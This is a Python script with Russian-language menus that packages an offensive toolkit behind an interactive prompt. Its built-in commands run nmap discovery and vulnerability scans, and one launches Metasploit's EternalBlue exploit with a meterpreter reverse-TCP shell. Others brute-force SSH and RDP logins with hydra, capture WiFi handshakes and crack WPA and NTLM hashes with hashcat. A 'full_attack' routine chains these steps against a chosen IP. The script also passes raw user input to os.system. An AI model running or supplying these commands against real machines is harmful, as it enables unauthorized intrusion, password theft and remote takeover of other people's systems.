#!/usr/bin/env python3
# ===============================================================
#              ███████ ██    ██ ██████  ███████ ██████
#              ██      ██    ██ ██   ██ ██      ██   ██
#              ███████ ██    ██ ██████  █████   ██████
#                   ██ ██    ██ ██      ██      ██   ██
#              ███████  ██████  ██      ███████ ██   ██
# ====================== ЛИЧНЫЙ ФРЕЙМВОРК ======================
#                         by: ТЫ (ИСПРАВЛЕННАЯ ВЕРСИЯ)
# ===============================================================

import os
import sys

class colors:
    RED = '\033[91m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    BLUE = '\033[94m'
    PURPLE = '\033[95m'
    CYAN = '\033[96m'
    BOLD = '\033[1m'
    END = '\033[0m'

class SuperFrame:
    def __init__(self):
        self.version = "4.0"
        self.creator = "ТЫ"
        self.running = True
        self.target = None
        self.work_path = "/home/quaric/Документы/hacks/work"
        self.user_commands = {}

        self.builtins = {
            "find": {
                "cmd": "nmap -sn 192.168.1.0/24 | grep \"Nmap scan\"",
                "desc": "найти все живые IP в сети"
            },
            "set_target": {
                "cmd": self.cmd_set_target,
                "desc": "установить цель (ввести IP)"
            },
            "scan": {
                "cmd": "nmap -T4 -F $TARGET",
                "desc": "быстрый скан портов"
            },
            "deep": {
                "cmd": "nmap -sV -p- --script vuln $TARGET",
                "desc": "глубокий скан + уязвимости"
            },
            "check_eternal": {
                "cmd": "nmap --script smb-vuln-ms17-010 -p445 $TARGET",
                "desc": "проверить на EternalBlue"
            },
            "attack_eternal": {
                "cmd": 'msfconsole -q -x "use exploit/windows/smb/ms17_010_eternalblue; set RHOSTS $TARGET; set PAYLOAD windows/x64/meterpreter/reverse_tcp; set LHOST $(ip -4 addr show | grep -oP \"(?<=inet\s)\d+(\.\d+){3}\" | grep -v 127.0.0.1 | head -1); set LPORT 4444; run"',
                "desc": "атака EternalBlue (Metasploit)"
            },
            "brute_ssh": {
                "cmd": "hydra -l root -P /usr/share/wordlists/rockyou.txt ssh://$TARGET -t 4",
                "desc": "брутфорс SSH (hydra)"
            },
            "brute_rdp": {
                "cmd": "hydra -l administrator -P /usr/share/wordlists/rockyou.txt rdp://$TARGET -t 4",
                "desc": "брутфорс RDP (hydra)"
            },
            "save": {
                "cmd": "nmap -sV $TARGET > /home/quaric/Документы/hacks/work/scan_$TARGET.txt",
                "desc": "сохранить скан в файл"
            },
            "log": {
                "cmd": 'echo "$(date): scanning $TARGET" >> /home/quaric/Документы/hacks/work/log.txt && nmap $TARGET >> /home/quaric/Документы/hacks/work/log.txt',
                "desc": "записать в лог"
            },
            "wifi_start": {
                "cmd": "sudo airmon-ng start wlan0",
                "desc": "включить монитор режим"
            },
            "wifi_stop": {
                "cmd": "sudo airmon-ng stop wlan0mon",
                "desc": "выключить монитор режим"
            },
            "wifi_capture": {
                "cmd": "sudo airodump-ng wlan0mon",
                "desc": "захват handshake"
            },
            "crack_wifi": {
                "cmd": "hashcat -m 22000 /home/quaric/Документы/hacks/work/handshake.hc22000 /usr/share/wordlists/rockyou.txt --force -O",
                "desc": "взлом WiFi (hashcat)"
            },
            "crack_ntlm": {
                "cmd": "hashcat -m 1000 /home/quaric/Документы/hacks/work/hash.txt /usr/share/wordlists/rockyou.txt --force -O",
                "desc": "взлом Windows-пароля"
            },
            "full_attack": {
                "cmd": self.cmd_full_attack,
                "desc": "атака всё сразу"
            }
        }

    def cmd_set_target(self, args):
        ip = input(colors.YELLOW + "ВВЕДИ IP ЦЕЛИ: " + colors.END).strip()
        if ip:
            self.target = ip
            print(colors.GREEN + f"[+] Цель установлена: {self.target}" + colors.END)
        else:
            print(colors.RED + "[-] IP не введён" + colors.END)

    def cmd_full_attack(self, args):
        if not self.target:
            print(colors.RED + "[-] Сначала установи цель (set_target)" + colors.END)
            return
        print(colors.YELLOW + "[*] Начинаю полную атаку..." + colors.END)
        os.system(f"echo '[+] Scanning...'; nmap -F {self.target}")
        os.system(f"echo '[+] EternalBlue...'; nmap --script smb-vuln-ms17-010 -p445 {self.target}")
        os.system(f"echo '[+] SSH...'; hydra -l root -P /usr/share/wordlists/rockyou.txt ssh://{self.target} -t 4")

    def show_banner(self):
        os.system('clear')
        print(colors.CYAN + colors.BOLD)
        print("╔════════════════════════════════════════════════════╗")
        print("║      ███████ ██    ██ ██████  ███████ ██████      ║")
        print("║      ██      ██    ██ ██   ██ ██      ██   ██     ║")
        print("║      ███████ ██    ██ ██████  █████   ██████      ║")
        print("║           ██ ██    ██ ██      ██      ██   ██     ║")
        print("║      ███████  ██████  ██      ███████ ██   ██     ║")
        print("╚════════════════════════════════════════════════════╝")
        print(colors.END)
        print(colors.GREEN + f"  🔥 ЛИЧНЫЙ ФРЕЙМВОРК v{self.version} by {self.creator}" + colors.END)
        print(colors.YELLOW + f"  📁 РАБОЧАЯ ПАПКА: {self.work_path}" + colors.END)
        print(colors.PURPLE + "  ⚡ secretcheat — скрытая шпаргалка" + colors.END)
        if self.target:
            print(colors.CYAN + f"  🎯 ТЕКУЩАЯ ЦЕЛЬ: {self.target}" + colors.END)
        print("")

    def show_help(self):
        print(colors.GREEN + "\n═══════════════════════════════════════════" + colors.END)
        print(colors.BOLD + "            📋 ВСТРОЕННЫЕ КОМАНДЫ" + colors.END)
        print(colors.GREEN + "═══════════════════════════════════════════" + colors.END)
        for name, info in self.builtins.items():
            print(f"  {colors.CYAN}{name:15}{colors.END} - {info['desc']}")
        print(colors.GREEN + "═══════════════════════════════════════════" + colors.END)
        print("")
        print(colors.YELLOW + "Дополнительно:" + colors.END)
        print("  help         — это меню")
        print("  list         — показать все команды (встроенные + твои)")
        print("  add <name> '<cmd>' — добавить свою команду")
        print("  run <cmd>    — выполнить системную команду")
        print("  clear        — очистить экран")
        print("  secretcheat  — показать шпаргалку (то же самое)")
        print("  exit         — выйти")
        print("")

    def show_list(self):
        print(colors.GREEN + "\n[ ВСЕ КОМАНДЫ ]" + colors.END)
        for name, info in self.builtins.items():
            print(f"  {colors.CYAN}{name:15}{colors.END} - {info['desc']}")
        if self.user_commands:
            print(colors.GREEN + "\n[ ТВОИ КОМАНДЫ ]" + colors.END)
            for name, cmd in self.user_commands.items():
                print(f"  {colors.PURPLE}{name:15}{colors.END} - {cmd}")
        else:
            print(colors.YELLOW + "  (нет добавленных команд)" + colors.END)

    def show_cheat(self):
        self.show_list()

    def cmd_add(self, args):
        if len(args) < 3:
            print(colors.RED + "[-] Используй: add <имя> '<команда>'" + colors.END)
            return
        name = args[1]
        action = ' '.join(args[2:]).strip("'\"")
        self.user_commands[name] = action
        print(colors.GREEN + f"[+] Команда '{name}' добавлена!" + colors.END)

    def run(self):
        self.show_banner()
        self.show_help()

        while self.running:
            try:
                cmd_line = input(colors.PURPLE + "\nframe> " + colors.END).strip()
                if not cmd_line:
                    continue

                parts = cmd_line.split()
                cmd = parts[0].lower()

                if cmd == "help":
                    self.show_help()
                elif cmd == "list":
                    self.show_list()
                elif cmd == "secretcheat":
                    self.show_cheat()
                elif cmd == "add":
                    self.cmd_add(parts)
                elif cmd == "run":
                    os.system(' '.join(parts[1:]))
                elif cmd == "clear":
                    self.show_banner()
                    self.show_help()
                elif cmd == "exit":
                    print(colors.RED + "[-] Выход. Пока!" + colors.END)
                    self.running = False
                elif cmd in self.builtins:
                    info = self.builtins[cmd]
                    if callable(info["cmd"]):
                        info["cmd"](parts[1:])
                    else:
                        cmd_str = info["cmd"].replace("$TARGET", self.target if self.target else "")
                        if "$TARGET" in info["cmd"] and not self.target:
                            print(colors.RED + "[-] Сначала установи цель (set_target)" + colors.END)
                            continue
                        print(colors.YELLOW + f"[*] Выполняю: {cmd_str}" + colors.END)
                        os.system(cmd_str)
                elif cmd in self.user_commands:
                    print(colors.YELLOW + f"[*] Выполняю твою команду: {self.user_commands[cmd]}" + colors.END)
                    os.system(self.user_commands[cmd])
                else:
                    print(colors.RED + f"[-] Неизвестная команда: {cmd}" + colors.END)

            except KeyboardInterrupt:
                print(colors.RED + "\n[-] Пока!" + colors.END)
                self.running = False
                break
            except Exception as e:
                print(colors.RED + f"[-] Ошибка: {e}" + colors.END)

if __name__ == "__main__":
    frame = SuperFrame()
    frame.run()

